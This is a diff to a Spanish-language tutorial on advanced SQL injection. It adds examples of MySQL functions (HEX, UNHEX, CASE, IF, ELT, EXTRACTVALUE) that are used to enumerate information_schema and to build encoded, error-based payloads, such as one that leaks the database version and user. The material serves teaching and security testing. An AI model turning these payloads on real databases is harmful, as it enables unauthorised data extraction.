@@ -36,7 +36,18 @@
    * [Codificación Hex](#Codificación-Hex)
 * [Crear payloads codificados](#Crear payloads codificados)
 * [Haciendo uso de funciones sql para obtener información](#Haciendo-uso-de-funciones-sql-para-obtener-información)
-      
+   * [RPAD](#RPAD)
+   * [SOUNDS LIKE](#SOUNDS-LIKE)
+   * [UPPER](#UPPER)
+   * [REVERSE](#REVERSE)
+   * [RIGHT](#RIGHT)
+   * [ELT](#ELT)
+   * [HEX](#HEX)
+   * [HUNEX](#HUNEX)
+   * [CASE](#CASE)
+   * [IF](#IF)
+   * [EXTRACTVALUE](#EXTRACTVALUE)
+
 ## Antes de comenzar
 
 Este escrito esta pensado como una continuación directa a mi anterior lectura de inyecciones sqli en donde se explican de manera un poco más general las bases de esta vulnerabilidad , por lo que si no estas al tanto de ella te recomiendo que primero le des un repaso antes de empezar esta lectura, ya que este escrito será un poco más avanzado.
@@ -395,10 +406,41 @@ Sintaxis: `ELT(N, str1[, str2, str3,...])`
 
 Ejemplo:
 
-HEX
-HUNEX
-CASE
-IF
-EXTRACTVALUE
+`Select elt(1, table_Name) from information_schema.tables`
+
+### HEX
+
+Sintaxis: `HEX(N_or_S)`
+
+Ejemplo:
+
+`Select hex( table_Name) from information_schema.tables`
+
+### HUNEX
+
+Sintaxis: `UNHEX(str)`
+
+Ejemplo: `Select unhex(hex( table_Name)) from information_schema.tables`
+
+### CASE
+
+Ejemplo: `SELECT CASE WHEN (1=1) THEN table_name ELSE false END from information_schema.tables`
+
+### IF
+
+Ejemplo: `SELECT if(1=1,table_name,'<h3><font color=blue> Tablas:</h3>') from information_schema.tables`
+
+### EXTRACTVALUE
+
+Sintaxis: `EXTRACTVALUE(xml_frag, xpath_expr)`
+
+Ejemplo: `SELECT extractvalue(rand(),concat(0x7e,version(),0x7e,user()))`
+
+Con esto en mente, podemos mezclar entre funciones, diferentes tipos de codificacion y diferente sintaxis en las secuencias de sql para crear payloads cada vez más personalizados.
+
+
+## Pasando de Inyección sql a otras vulnerabilidades
+
+###
 
 
